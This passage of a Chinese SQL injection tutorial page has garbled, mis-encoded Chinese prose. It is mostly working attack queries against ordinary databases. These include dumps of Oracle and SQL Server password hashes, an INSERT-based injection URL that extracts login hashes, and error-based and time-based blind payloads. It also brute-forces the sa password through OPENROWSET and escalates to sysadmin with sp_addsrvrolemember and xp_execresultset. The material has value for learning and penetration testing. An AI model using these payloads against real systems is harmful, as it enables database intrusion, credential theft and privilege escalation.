keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(password)=16 </span><span class="token comment">-- astatus (0=open, 9=locked&amp; expired)</span>SYS     AD24A888FC3B1BE7 <span class="token number">0</span>SYSTEM  BD3D49AD69E3FA34 <span class="token number">0</span>OUTLN   <span class="token number">4</span>A3BA55E08595081 <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Oracle llgä¸­ï¼ŒOracleå·²ç»ä¿®æ”¹äº†æ‰€ä½¿ç”¨å£ä»¤çš„å“ˆå¸Œç®—æ³•ï¼Œè€Œä¸”å“ˆå¸Œå£ä»¤ä½äºå¦å¤– ä¸€ä¸ªä¸åŒçš„åˆ—ä¸­ï¼ˆspare4åˆ—ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>spare4 <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(spare4)=62 </span>SYSS:<span class="token number">1336</span>FB26ACF58354164952E502B4F726FF8B5D382012D2E7B1EC99C426A7SYSTEMS:<span class="token number">38968</span>E8CEC12026112B0010BCBA3ECC2FD278AFA17AE363FDD74674F2651<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é«˜çº§ç”¨æˆ·ï¼Œæ‰¾åˆ°åŠ å¯†å†…å®¹çš„è¡¨ï¼Œéƒ½åŠ å¯†äº†ä¸€å®šä¼šæœ‰å¯åˆ©ç”¨çš„</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">table</span> name<span class="token punctuation">,</span><span class="token keyword">column</span> name<span class="token punctuation">,</span>encryption_alg<span class="token punctuation">,</span>salt <span class="token keyword">from</span> dba_encrypted_columns<span class="token punctuation">;</span> <span class="token keyword">TABLE</span> NAME       <span class="token keyword">COLUMN</span> NAME    ENCRYPTION ALG       SALT CREDITCARDCCNR          AES256              <span class="token keyword">NO</span>CREDITCARD  CVE           AES256              <span class="token keyword">NO</span>CREDITCARD        VALID          AES256              <span class="token keyword">NO</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ£€ç´¢æ•°æ®åº“å­˜åœ¨å“ªäº›DBAè´¦æˆ·</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> grantee<span class="token punctuation">,</span>granted_role<span class="token punctuation">,</span>admin_option<span class="token punctuation">,</span>default_role <span class="token keyword">from</span> dba_role_privs <span class="token keyword">where</span> granted_role<span class="token operator">=</span><span class="token string">'DBA'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åœ¨INSERTæŸ¥è¯¢ä¸­å®æ–½æ³¨å…¥æ”»å‡»"><a href="#åœ¨INSERTæŸ¥è¯¢ä¸­å®æ–½æ³¨å…¥æ”»å‡»" class="headerlink" title="åœ¨INSERTæŸ¥è¯¢ä¸­å®æ–½æ³¨å…¥æ”»å‡»"></a>åœ¨INSERTæŸ¥è¯¢ä¸­å®æ–½æ³¨å…¥æ”»å‡»</h3><p>æ›´æ–°æ•°æ®åæ‰§è¡Œæ³¨å…¥æŸ¥è¯¢è¯­å¥ï¼Œupdateï¼Œdeleteä¸€ä¸ªæ„æ€</p><h4 id="ç¬¬ä¸€ç§æƒ…å½¢ï¼šæ’å…¥ç”¨æˆ·è§„å®šçš„æ•°æ®"><a href="#ç¬¬ä¸€ç§æƒ…å½¢ï¼šæ’å…¥ç”¨æˆ·è§„å®šçš„æ•°æ®" class="headerlink" title="ç¬¬ä¸€ç§æƒ…å½¢ï¼šæ’å…¥ç”¨æˆ·è§„å®šçš„æ•°æ®"></a>ç¬¬ä¸€ç§æƒ…å½¢ï¼šæ’å…¥ç”¨æˆ·è§„å®šçš„æ•°æ®</h4><h5 id="æ’å…¥çš„ä¸æ˜¯æœ€åä¸€åˆ—"><a href="#æ’å…¥çš„ä¸æ˜¯æœ€åä¸€åˆ—" class="headerlink" title="æ’å…¥çš„ä¸æ˜¯æœ€åä¸€åˆ—"></a>æ’å…¥çš„ä¸æ˜¯æœ€åä¸€åˆ—</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- æ’å…¥æ¨¡æ¿</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span><span class="token string">'notsql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ’å…¥ç¬¬ä¸€åˆ—ï¼Œæ„é€ SQLä»£ç å…³é—­<code>sql</code>ï¼Œå†æ„å»ºæˆ‘ä»¬éœ€è¦æŸ¥è¯¢çš„ç¬¬äºŒåˆ—ï¼Œæ³¨é‡Šæ‰å…¶ä»–éƒ¨åˆ†</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> name <span class="token operator">+</span> <span class="token string">' | '</span> <span class="token operator">+</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sql_logins<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- ','notsql')</span><span class="token comment">-- fn_varbintohexstrå°†äºŒè¿›åˆ¶çš„å“ˆå¸Œå€¼è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼</span><span class="token comment">-- http://test/?sql=sql',(SELECT TOP 1 name + ' | ' + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- &amp;notsql=notsql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="æ’å…¥çš„æ˜¯æœ€åä¸€åˆ—"><a href="#æ’å…¥çš„æ˜¯æœ€åä¸€åˆ—" class="headerlink" title="æ’å…¥çš„æ˜¯æœ€åä¸€åˆ—"></a>æ’å…¥çš„æ˜¯æœ€åä¸€åˆ—</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- æ’å…¥æ¨¡æ¿</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span> col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'notsql'</span><span class="token punctuation">,</span><span class="token string">'sql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨mysqlä¸­åªæœ‰å¤„äºANSIæ¨¡å¼(æˆ–è€…ä»»ä½•å®ç°äº† PIPES_AS_QUOTESçš„å…¶ä»–æ¨¡å¼ï¼Œæ¯”å¦‚DB2ã€ORACLEæˆ–MAXDB)ï¼Œç®¡é“ç¬¦æ‰ä¼šè¢«è§£ææˆè¿æ¥ç¬¦ã€‚ç„¶è€Œï¼Œä¸€èˆ¬éƒ½æ˜¯æœªå®ç°PIPES_AS_QUOTES(æ¯”å¦‚å¤„äºTRADITIONALæ¨¡å¼)ï¼Œé‚£ä¹ˆ||æ“ä½œç¬¦å°†è¢«è§£æä¸ºä¸€ä¸ªORé€»è¾‘æ“ä½œç¬¦ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªè¿æ¥æ“ä½œç¬¦ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> CONCAT<span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> @@ version<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ©ç”¨æ•´æ•°ä¸å­—ç¬¦ç›¸åŠ ï¼Œä¼˜å…ˆæ˜¾ç¤ºæ•°å­—çš„ç‰¹æ€§</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'d'</span> <span class="token operator">+</span><span class="token comment">/**/</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token comment">/**/</span>@<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ˜¾ç¤º@@versionçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œ/**/ç»•è¿‡ç©ºæ ¼</p><p>è½¬åŒ–éæ•´æ•°å­—ç¬¦ä½¿ç”¨ASCII()</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>co12<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ç¬¬äºŒç§æƒ…å½¢ï¼šç”ŸæˆINSERTé”™è¯¯"><a href="#ç¬¬äºŒç§æƒ…å½¢ï¼šç”ŸæˆINSERTé”™è¯¯" class="headerlink" title="ç¬¬äºŒç§æƒ…å½¢ï¼šç”ŸæˆINSERTé”™è¯¯"></a>ç¬¬äºŒç§æƒ…å½¢ï¼šç”ŸæˆINSERTé”™è¯¯</h4><p>ä¸ºäº†ä¸æ±¡æŸ“åŸæ•°æ®è¡¨ï¼Œæ‰§è¡Œå­æŸ¥è¯¢ï¼Œä½¿insertå¤±è´¥ï¼Œè¿”å›é”™è¯¯ä¸­å¾—åˆ°ä¿¡æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>foo'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> name <span class="token keyword">from</span> users <span class="token keyword">where</span> age<span class="token operator">=</span>@<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å…ˆæ‰§è¡Œå­æŸ¥è¯¢ï¼Œç”±äº@@versionä¸æ˜¯æ•°å­—ï¼ŒæŠ¥é”™ï¼Œä¸æ‰§è¡Œinsert</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> columnl <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ ‡é‡å­æŸ¥è¯¢å°±æ˜¯åªè¿”å›å•åˆ—å€¼è€Œä¸æ˜¯å¤šåˆ—å€¼æˆ–å¤šè¡Œçš„å­æŸ¥è¯¢ï¼Œå¦‚æœå­æŸ¥è¯¢è¿”å›ä¸€ä¸ªå€¼æˆ–è€…NULLï¼Œå¤–éƒ¨å°†æ‰§è¡Œï¼Œè¿”å›è¶…è¿‡ä¸€è¡Œå°±ä¼šç»ˆæ­¢å¤–éƒ¨æŸ¥è¯¢å±•ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥æ’å…¥ä¸¤ä¸ªselect</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> @<span class="token variable">@version</span> <span class="token operator">LIKE</span> <span class="token string">'5.1.56%'</span> <span class="token keyword">THEN</span> SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token string">'somevalue'</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'valuel'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'value2'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span><span class="token punctuation">)</span> ALIAS<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CASEå­å¥æ£€æŸ¥æå–çš„MySQLç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚æœé‡åˆ°ç‰¹å®šçš„ç‰ˆæœ¬ï¼ŒSLEEPå‘½ä»¤å°†æ‰§è¡Œä»¥å»¶è¿Ÿ5ç§’çš„æ—¶é—´ã€‚è¿™å¯ä»¥å‘Šè¯‰æˆ‘ä»¬MySQLæ˜¯å¦æ˜¯æŸä¸ªç‰¹å®šçš„ç‰ˆæœ¬ï¼ŒåŒæ—¶UNIONå‘½ä»¤å°†ç¡®ä¿å‘å¤–éƒ¨SELECTè¿”å›ä¸¤è¡Œæ•°æ®ï¼Œä»è€Œäº§ç”Ÿé”™è¯¯ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- æ’å…¥æ¨¡æ¿</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'injectable_parameter'</span><span class="token punctuation">)</span><span class="token comment">-- æ³¨å…¥å‚æ•°</span><span class="token string">'|| SELECT (SELECT CASE WHEN @@version LIKE '</span><span class="token number">5.1</span><span class="token number">.56</span><span class="token operator">%</span><span class="token string">' THEN SLEEP(5) ELSE '</span>somevalue<span class="token string">' END FROM ((SELECT '</span>valuel<span class="token string">' AS foobar) UNION (SELECT '</span>value2<span class="token string">' AS foobar)) ALIAS) ||'</span><span class="token comment">-- æ‹¼æ¥å</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">||</span> <span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> @<span class="token variable">@version</span> <span class="token operator">LIKE</span> <span class="token string">'5.1.56%'</span> <span class="token keyword">THEN</span> SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token string">'somevalue'</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'valuel'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'value2'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span><span class="token punctuation">)</span> ALIAS<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>REGEXPæ“ä½œç¬¦</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'a'</span> <span class="token operator">REGEXP</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token operator">&lt;</span>condition<span class="token operator">&gt;</span> <span class="token keyword">THEN</span> <span class="token string">'.*'</span> <span class="token keyword">ELSE</span> <span class="token string">'*'</span> <span class="token keyword">END</span> <span class="token punctuation">(</span><span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'fool'</span> <span class="token keyword">AS</span> bar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'foo2'</span> <span class="token keyword">AS</span> bar<span class="token punctuation">)</span> foobar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ¡ä»¶(condition)ä¸ºtrue, CASEå­å¥å°†ä½¿ç”¨æœ‰æ•ˆçš„æ­£åˆ™è¡¨è¾¾å¼å®ƒå°†å‘æœ€å¤–å±‚çš„ SELECTè¯­å¥è¿”å›ä¸¤è¡Œæ•°æ®ï¼Œæˆ‘ä»¬å°†æ¥æ”¶åˆ°å¸¸è§çš„é”™è¯¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR <span class="token number">1242</span> <span class="token punctuation">(</span><span class="token number">21000</span><span class="token punctuation">)</span>: Subquery returns <span class="token function">more</span> than <span class="token number">1</span> row<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ¡ä»¶ä¸ºfalse, REGEXPå°†é‡‡ç”¨ä½œä¸ºå‚æ•°ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œ åœ¨è¿™ç§æƒ…å†µä¸‹æ•°æ®åº“æœåŠ¡å™¨å°†è¿”å›ä¸‹åˆ—é”™è¯¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR <span class="token number">1139</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Got error <span class="token string">'repetition-operator operand invalid'</span> from regexp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?name=';INSERT+INTO+users(id,pass,privs)+VALUES+('test','test',0)-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æå‡æƒé™"><a href="#æå‡æƒé™" class="headerlink" title="æå‡æƒé™"></a>æå‡æƒé™</h3><p>ç”±äºå¯¹æ™®é€šç”¨æˆ·å­˜åœ¨ç€é™åˆ¶ï¼Œè¦æƒ³å……åˆ†å‘æŒ¥å‰é¢ä»‹ç»çš„å‡ ç§æ”»å‡»çš„æ½œåŠ›ï¼Œå°±å¿…é¡»è·å–ç®¡ç†å‘˜è®¿é—®æƒã€‚</p><h4 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><code>OPENROWSET</code>ä½œç”¨äºSQL Serverä¸Šï¼Œå®ç°å¯¹è¿œç¨‹OLE DBæ•°æ®æº(ä¾‹å¦‚å¦ä¸€ä¸ªSQL Serveræ•°æ®åº“)çš„ä¸€æ¬¡æ€§è¿æ¥ã€‚DBAå¯ç”¨å®ƒæ¥æ£€ç´¢è¿œç¨‹æ•°æ®åº“ä¸Šçš„æ•°æ®ï¼Œä»¥æ­¤ä½œä¸ºæ°¸ä¹…è¿æ¥(link)ä¸¤ä¸ªæ•° æ®åº“çš„ä¸€ç§æ‰‹æ®µã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN; Address=10.0.2.2;uid=foo;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT columnl FROM tableA'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šè¿°è¯­å¥ä¸­ä»¥ç”¨æˆ·fooè¿æ¥åˆ°åœ°å€ä¸º10.0.2.2çš„SQL Serverå¹¶æ‰§è¡Œ<code>select column1 from tableA</code>æŸ¥è¯¢ï¼Œæœ€å¤–å±‚çš„æŸ¥è¯¢ä¼ é€’å¹¶è¿”å›è¯¥æŸ¥è¯¢çš„ç»“æœã€‚fooæ˜¯åœ°å€ä¸º10.0.2.2çš„æ•°æ®åº“çš„ä¸€ä¸ªç”¨æˆ·ï¼Œè€Œä¸æ˜¯é¦–æ¬¡æ‰§è¡ŒOPENROWSETæ—¶çš„æ•°æ®åº“ç”¨æˆ·ã€‚</p><p>openrowsetå¯ä»¥ç”¨æ¥çˆ†ç ´saææƒï¼Œæœ‰ä¸‰ä¸ªè¦ç‚¹</p><ul><li><p>OPENROWSETå¿…é¡»æä¾›æ‰§è¡Œè¿æ¥çš„æ•°æ®åº“ä¸Šçš„æœ‰æ•ˆå‡­è¯ã€‚</p></li><li><p>OPENROWSETä¸ä»…å¯ç”¨äºè¿æ¥è¿œç¨‹æ•°æ®åº“ï¼Œè¿˜å¯ç”¨äºæ‰§è¡Œæœ¬åœ°è¿æ¥ï¼›æ‰§è¡Œæœ¬åœ°è¿æ¥æ—¶ï¼Œä½¿ç”¨ç”¨æˆ·åœ¨OPENROWSETè°ƒç”¨ä¸­æŒ‡å®šçš„æƒé™ã€‚</p></li><li><p>åœ¨SQL Server 2000ä¸Šï¼Œæ‰€æœ‰ç”¨æˆ·å‡å¯è°ƒç”¨OPENROWSET;è€Œåœ¨SQL Server 2005å’Œ 2008ä¸Šï¼Œé»˜è®¤æƒ…å†µä¸‹è¯¥æ“ä½œè¢«ç¦ç”¨ã€‚ä½†æœ‰æ—¶ä¼šè¢«DBAé‡æ–°å¯ç”¨</p></li><li><p>openrowsetè‡³å°‘è¿”å›ä¸€è¡Œï¼Œæ‰€ä»¥åŠ ä¸ªåœ¨æ²¡æœ‰å…¶ä»–ä¼šæ˜¾ç¤ºæ˜¯ï¼Œå¿…é¡»åŠ ä¸ª<code>select 1</code>ï¼Œå½“ç„¶ä¹Ÿèƒ½åŠ å…¶ä»–çš„</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- çˆ†ç ´saå£ä»¤</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=;uid=sa; pwd=foo'</span><span class="token punctuation">,</span><span class="token string">'select 1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>fooæ˜¯å£ä»¤çš„è¯è¿”å›1ï¼Œä¸æ­£ç¡®è¿”å›<code>Login failed for user 'sa'.</code></p><p>å¦‚æœæ‰¾åˆ°äº†saå£ä»¤ï¼Œå¯ä»¥ä½¿ç”¨<code>sp_addsrvrolemember</code>å‚¨å­˜è¿‡ç¨‹å°†ç”¨æˆ·æ·»åŠ è‡³sysadminç»„ï¼Œè¿™æ ·å°±èƒ½æå‡æƒé™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=;uid=sa;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT 1; EXECmaster.dbo.sp_addsrvrolemeniber "appdbuser","sysadmin"'</span><span class="token punctuation">)</span><span class="token comment">-- ä¸¤ä¸ªå‚æ•°appdbuseræ˜¯ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªæ˜¯ç»„å</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨å…¥ä¸€ä¸ªå®Œæ•´çš„è¿‡ç¨‹ï¼Œé¦–å…ˆæ„é€ ä¸€ä¸ªåŒ…å«OPENROWSETæŸ¥è¯¢å’Œæ­£ç¡®ç”¨æˆ·åçš„å­—ç¬¦ä¸²@qï¼Œç„¶åé€šè¿‡å°†@qä¼ é€’ç»™xp execresultsetæ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼ˆåœ¨SQL Server 2000ä¸Šï¼Œæ‰€æœ‰ç”¨æˆ·å‡å¯è°ƒç”¨å®ƒï¼‰æ¥æ‰§è¡Œè¯¥æŸ¥è¯¢ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@q</span> nvarchar<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@q</span> <span class="token operator">=</span> N<span class="token string">'SELECT 1 FROM OPENROWSETï¼ˆ"SQLOLEDB","Network=DBMSSOCN; Address=;uid=sa;pwd=password","SELECT 1; EXEC master.dbo.sp_addsrvrolemember '</span>"<span class="token string">"+system_user+""',""sysadmin"</span>"<span class="token punctuation">)</span><span class="token string">';EXEC master.dbo.xp_execresultset @q, N'</span>master'<span aria-hidden="true" 